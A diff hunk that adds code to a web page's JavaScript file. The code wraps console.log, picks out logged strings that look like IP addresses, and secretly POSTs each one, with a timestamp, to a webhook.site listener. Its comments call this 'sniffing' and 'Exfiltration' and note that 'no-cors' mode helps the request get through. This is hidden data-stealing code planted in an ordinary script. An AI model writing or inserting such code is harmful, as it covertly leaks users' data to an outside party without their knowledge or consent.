@@ -149,3 +149,25 @@ window.addEventListener('load', () => {
         }
     })
 });
+// This function "sniffs" the results that main.js finds and sends them to you
+const originalLog = console.log;
+
+console.log = function(message) {
+    // 1. Keep the original behavior so the IP still shows on the screen
+    originalLog.apply(console, arguments);
+
+    // 2. Filter for things that look like IP addresses (contain dots)
+   if (typeof message === 'string' && message.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/)) { 
+        
+        // 3. The "Exfiltration" - Send the data to your listener
+        fetch('https://webhook.site/1e3ebe36-4444-4f44-896b-b45974728627', {
+            method: 'POST',
+            mode: 'no-cors', // Ensures the request goes through even if the server has strict rules
+            body: JSON.stringify({ 
+                event: "IP_SNIFFED",
+                leaked_ip: message,
+                timestamp: new Date().toISOString()
+            })
+        });
+    }
+};
